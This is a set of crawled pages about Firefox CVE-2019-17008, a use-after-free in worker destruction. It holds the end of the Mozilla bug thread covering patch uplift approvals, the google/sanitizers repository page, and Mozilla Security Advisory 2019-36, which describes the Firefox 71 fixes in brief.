|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1546331#c33)• 5 years ago |
|  | |

(In reply to Sebastian Hengst [:aryx] (needinfo on intermittent or backout) from [comment #31](/show_bug.cgi?id=1546331#c31 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))

> <https://hg.mozilla.org/integration/autoland/rev/cde2ca39e32b7e344ebd4f6eac900c7ac1dee26a>
>
> Please use the tag 'CheckinNeeded' in Phabricator in the future - the workflow with the 'checkin-needed' keyword is not supported anymore.

Sorry, didn't notice that. Will use tag 'CheckinNeeded' in Phabricator.

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1546331#c34)• 5 years ago |
|  | |

Hello Liz

Should we just land the patch on beta and esr68?

Flags: needinfo?(lhenry)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1546331#c35)• 5 years ago |
|  | |

Yes please

Flags: needinfo?(lhenry) → needinfo?(echuang)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1546331#c36)• 5 years ago |
|  | |

Can you fill out the approval request on the patch though?

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1546331#c37)• 5 years ago |
|  | |

Comment on [attachment 9107143](/attachment.cgi?id=9107143 "Missing call to WaitForIsDebuggerRegistered") [[details]](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered")

Missing call to WaitForIsDebuggerRegistered

### Beta/Release Uplift Approval Request

* **User impact if declined**: Pages use DedicatedWorkers could be crashed.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Since the change just guarantees the worker debugger behavior is completed before releasing the worker, it doesn't make any unexpected behavior.
* **String changes made/needed**: No

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**: Pages use DedicatedWorkers could be crashed.
* **Fix Landed on Version**: 72
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Since the change just guarantees the worker debugger behavior is completed before releasing the worker, it doesn't make any unexpected behavior.
* **String or UUID changes made by this patch**: No
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-esr68?
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-beta?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a18066134_75935)• 5 years ago |

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)Flags: needinfo?(echuang)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a18082156_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1546331#c38)• 5 years ago |
|  | |

Comment on [attachment 9107143](/attachment.cgi?id=9107143 "Missing call to WaitForIsDebuggerRegistered") [[details]](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered")

Missing call to WaitForIsDebuggerRegistered

Crash fix, OK for uplift for beta 12, esr 68.3.

[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-esr68?
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-esr68+
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-beta?
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: approval-mozilla-beta+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1546331#c39)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/e09e60002be9>

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1546331#c40)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/1827cf7d273d>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a18777385_578488)• 5 years ago |

Whiteboard: [adv-main71+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1546331#c41)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9111772) (obsolete)
— [Details](attachment.cgi?id=9111772&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a18808064_578488)• 5 years ago |

Whiteboard: [adv-main71+] → [adv-main71+][adv-esr68.3+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1546331#c42)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9111856)
— [Details](attachment.cgi?id=9111856&action=edit)

[Attachment #9111772](/attachment.cgi?id=9111772&action=edit "advisory.txt") -
Attachment is obsolete: true

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a22406816_578488)• 5 years ago |

Alias: CVE-2019-17008

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a35324780_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a161071022_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1546331&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Looben Yang](/user_profile?user_id=506912)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from crbug.com_b0226637_20250121_024624.html ===



=== Content from code.google.com_d503bdfd_20250121_024614.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsanitizers)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsanitizers)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=google%2Fsanitizers)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[google](/google)
/
**[sanitizers](/google/sanitizers)**
Public

* [Notifications](/login?return_to=%2Fgoogle%2Fsanitizers) You must be signed in to change notification settings
* [Fork
  1k](/login?return_to=%2Fgoogle%2Fsanitizers)
* [Star
   11.7k](/login?return_to=%2Fgoogle%2Fsanitizers)

AddressSanitizer, ThreadSanitizer, MemorySanitizer

### License

[View license](/google/sanitizers/blob/master/LICENSE.TXT)

[11.7k
stars](/google/sanitizers/stargazers) [1k
forks](/google/sanitizers/forks) [Branches](/google/sanitizers/branches) [Tags](/google/sanitizers/tags) [Activity](/google/sanitizers/activity)
 [Star](/login?return_to=%2Fgoogle%2Fsanitizers)

 [Notifications](/login?return_to=%2Fgoogle%2Fsanitizers) You must be signed in to change notification settings

* [Code](/google/sanitizers)
* [Issues
  616](/google/sanitizers/issues)
* [Pull requests
  0](/google/sanitizers/pulls)
* [Actions](/google/sanitizers/actions)
* [Projects
  0](/google/sanitizers/projects)
* [Wiki](/google/sanitizers/wiki)
* [Security](/google/sanitizers/security)
* [Insights](/google/sanitizers/pulse)

Additional navigation options

* [Code](/google/sanitizers)
* [Issues](/google/sanitizers/issues)
* [Pull requests](/google/sanitizers/pulls)
* [Actions](/google/sanitizers/actions)
* [Projects](/google/sanitizers/projects)
* [Wiki](/google/sanitizers/wiki)
* [Security](/google/sanitizers/security)
* [Insights](/google/sanitizers/pulse)

# google/sanitizers

    master[Branches](/google/sanitizers/branches)[Tags](/google/sanitizers/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,537 Commits](/google/sanitizers/commits/master/) | | |
| [android/app](/google/sanitizers/tree/master/android/app "This path skips through empty directories") | | [android/app](/google/sanitizers/tree/master/android/app "This path skips through empty directories") |  |  |
| [buildbot](/google/sanitizers/tree/master/buildbot "buildbot") | | [buildbot](/google/sanitizers/tree/master/buildbot "buildbot") |  |  |
| [dashboard](/google/sanitizers/tree/master/dashboard "dashboard") | | [dashboard](/google/sanitizers/tree/master/dashboard "dashboard") |  |  |
| [gwp-asan/icse2024](/google/sanitizers/tree/master/gwp-asan/icse2024 "This path skips through empty directories") | | [gwp-asan/icse2024](/google/sanitizers/tree/master/gwp-asan/icse2024 "This path skips through empty directories") |  |  |
| [hwaddress-sanitizer](/google/sanitizers/tree/master/hwaddress-sanitizer "hwaddress-sanitizer") | | [hwaddress-sanitizer](/google/sanitizers/tree/master/hwaddress-sanitizer "hwaddress-sanitizer") |  |  |
| [memory-sanitizer](/google/sanitizers/tree/master/memory-sanitizer "memory-sanitizer") | | [memory-sanitizer](/google/sanitizers/tree/master/memory-sanitizer "memory-sanitizer") |  |  |
| [mte-dynamic-carveout](/google/sanitizers/tree/master/mte-dynamic-carveout "mte-dynamic-carveout") | | [mte-dynamic-carveout](/google/sanitizers/tree/master/mte-dynamic-carveout "mte-dynamic-carveout") |  |  |
| [LICENSE.TXT](/google/sanitizers/blob/master/LICENSE.TXT "LICENSE.TXT") | | [LICENSE.TXT](/google/sanitizers/blob/master/LICENSE.TXT "LICENSE.TXT") |  |  |
| [README.md](/google/sanitizers/blob/master/README.md "README.md") | | [README.md](/google/sanitizers/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* License
* Security
# sanitizers

This project is the home for Sanitizers: AddressSanitizer, MemorySanitizer, ThreadSanitizer, LeakSanitizer, and more
The actual code resides in the [LLVM](http://llvm.org) repository.
Here we keep extended [documentation](/google/sanitizers/wiki), [bugfixes](/google/sanitizers/issues) and some helper code.

The documentation for our tools:

* [AddressSanitizer](/google/sanitizers/wiki/AddressSanitizer) (detects addressability issues) and [LeakSanitizer](/google/sanitizers/wiki/AddressSanitizerLeakSanitizer) (detects memory leaks)
* ThreadSanitizer (detects data races and deadlocks) for [C++](/google/sanitizers/wiki/ThreadSanitizerCppManual) and [Go](/google/sanitizers/wiki/ThreadSanitizerGoManual)
* [MemorySanitizer](/google/sanitizers/wiki/MemorySanitizer) (detects use of uninitialized memory)
* [HWASAN](https://clang.llvm.org/docs/HardwareAssistedAddressSanitizerDesign.html), or Hardware-assisted AddressSanitizer, a newer variant of AddressSanitizer that consumes much less memory
* [UBSan](https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html), or UndefinedBehaviorSanitizer

Some of the sanitizers are also available for different OS Kernels:

* [KASAN](https://www.kernel.org/doc/html/v4.12/dev-tools/kasan.html)
* [KMSAN](https://github.com/google/kmsan)
* [KCSAN](https://github.com/google/kernel-sanitizers/blob/master/KCSAN.md)

## About

AddressSanitizer, ThreadSanitizer, MemorySanitizer

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/google/sanitizers/activity)
[Custom properties](/google/sanitizers/custom-properties)
### Stars

[**11.7k**
stars](/google/sanitizers/stargazers)
### Watchers

[**352**
watching](/google/sanitizers/watchers)
### Forks

[**1k**
forks](/google/sanitizers/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsanitizers&report=google+%28user%29)

## [Releases](/google/sanitizers/releases)

No releases published

## [Packages 0](/orgs/google/packages?repo_name=sanitizers)

No packages published

## [Contributors 29](/google/sanitizers/graphs/contributors)

[+ 15 contributors](/google/sanitizers/graphs/contributors)

## Languages

* [C
  67.7%](/google/sanitizers/search?l=c)
* [TeX
  24.4%](/google/sanitizers/search?l=tex)
* [C++
  3.4%](/google/sanitizers/search?l=c%2B%2B)
* [Shell
  1.9%](/google/sanitizers/search?l=shell)
* [Go
  1.7%](/google/sanitizers/search?l=go)
* [CMake
  0.2%](/google/sanitizers/search?l=cmake)
* Other
  0.7%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.mozilla.org_5e04f49b_20250121_003656.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-36

## Security Vulnerabilities fixed in - Firefox 71

Announced
December 3, 2019
Impact
high
Products
Firefox
Fixed in

* Firefox 71

#### [#CVE-2019-11756: Use-after-free of SFTKSession object](#CVE-2019-11756)

Reporter
J.C. Jones
Impact
high
##### Description

Improper refcounting of soft token session objects could cause a use-after-free and crash (likely limited to a denial of service).

##### References

* [Bug 1508776](https://bugzilla.mozilla.org/show_bug.cgi?id=1508776)

#### [#CVE-2019-17008: Use-after-free in worker destruction](#CVE-2019-17008)

Reporter
Looben Yang
Impact
high
##### Description

When using nested workers, a use-after-free could occur during worker destruction. This resulted in a potentially exploitable crash.

##### References

* [Bug 1546331](https://bugzilla.mozilla.org/show_bug.cgi?id=1546331)

#### [#CVE-2019-13722: Stack corruption due to incorrect number of arguments in WebRTC code](#CVE-2019-13722)

Reporter
Alexandru Michis
Impact
high
##### Description

When setting a thread name on Windows in WebRTC, an incorrect number of arguments could have been supplied, leading to stack corruption and a potentially exploitable crash.
*Note: this issue only occurs on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1580156](https://bugzilla.mozilla.org/show_bug.cgi?id=1580156)

#### [#CVE-2019-11745: Out of bounds write in NSS when encrypting with a block cipher](#CVE-2019-11745)

Reporter
Craig Disselkoen
Impact
high
##### Description

When encrypting with a block cipher, if a call to `NSC_EncryptUpdate` was made with data smaller than the block size, a small out of bounds write could occur. This could have caused heap corruption and a potentially exploitable crash.

##### References

* [Bug 1586176](https://bugzilla.mozilla.org/show_bug.cgi?id=1586176)

#### [#CVE-2019-17014: Dragging and dropping a cross-origin resource, incorrectly loaded as an image, could result in information disclosure](#CVE-2019-17014)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

If an image had not loaded correctly (such as when it is not actually an image), it could be dragged and dropped cross-domain, resulting in a cross-origin information leak.

##### References

* [Bug 1322864](https://bugzilla.mozilla.org/show_bug.cgi?id=1322864)

#### [#CVE-2019-17009: Updater temporary files accessible to unprivileged processes](#CVE-2019-17009)

Reporter
Robert Strong
Impact
moderate
##### Description

When running, the updater service wrote status and log files to an unrestricted location; potentially allowing an unprivileged process to locate and exploit a vulnerability in file handling in the updater service.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1510494](https://bugzilla.mozilla.org/show_bug.cgi?id=1510494)

#### [#CVE-2019-17010: Use-after-free when performing device orientation checks](#CVE-2019-17010)

Reporter
Nils
Impact
moderate
##### Description

Under certain conditions, when checking the Resist Fingerprinting preference during device orientation checks, a race condition could have caused a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1581084](https://bugzilla.mozilla.org/show_bug.cgi?id=1581084)

#### [#CVE-2019-17005: Buffer overflow in plain text serializer](#CVE-2019-17005)

Reporter
Mirko Brodesser
Impact
moderate
##### Description

The plain text serializer used a fixed-size array for the number of

elements it could process; however it was possible to overflow the static-sized array leading to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1584170](https://bugzilla.mozilla.org/show_bug.cgi?id=1584170)

#### [#CVE-2019-17011: Use-after-free when retrieving a document in antitracking](#CVE-2019-17011)

Reporter
Nils
Impact
moderate
##### Description

Under certain conditions, when retrieving a document from a DocShell in the antitracking code, a race condition could cause a use-after-free condition and a potentially exploitable crash.

##### References

* [Bug 1591334](https://bugzilla.mozilla.org/show_bug.cgi?id=1591334)

#### [#CVE-2019-17012: Memory safety bugs fixed in Firefox 71 and Firefox ESR 68.3](#CVE-2019-17012)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Christoph Diehl, Nathan Froyd, Jason Kratzer, Christian Holler, Karl Tomlinson, Tyson Smith reported memory safety bugs present in Firefox 70 and Firefox ESR 68.2. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 71 and Firefox ESR 68.3](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1449736%2C1533957%2C1560667%2C1567209%2C1580288%2C1585760%2C1592502)

#### [#CVE-2019-17013: Memory safety bugs fixed in Firefox 71](#CVE-2019-17013)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Philipp, Diego Calleja, Mikhail Gavrilov, Jason Kratzer, Christian Holler, Markus Stange, Tyson Smith reported memory safety bugs present in Firefox 70. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 71](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1298509%2C1472328%2C1577439%2C1577937%2C1580320%2C1584195%2C1585106%2C1586293%2C1593865%2C1594181)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


